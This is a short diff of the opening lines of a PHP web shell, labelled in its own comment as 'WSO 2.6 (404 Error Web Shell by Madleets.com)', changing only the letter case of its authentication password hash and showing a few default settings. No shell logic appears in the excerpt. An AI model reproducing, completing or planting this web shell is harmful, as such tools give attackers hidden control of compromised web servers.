@@ -1,7 +1,7 @@
 <?php 
 /* WSO 2.6 (404 Error Web Shell by Madleets.com) */
 /*Maded by DrSpy*/
-$auth_pass = "285f50029090af5de63c79700c4c4565"; 
+$auth_pass = "285F50029090AF5DE63C79700C4C4565"; 
 $color = "#00ff00"; 
 $default_action = 'FilesMan'; 
 $default_use_ajax = true; 
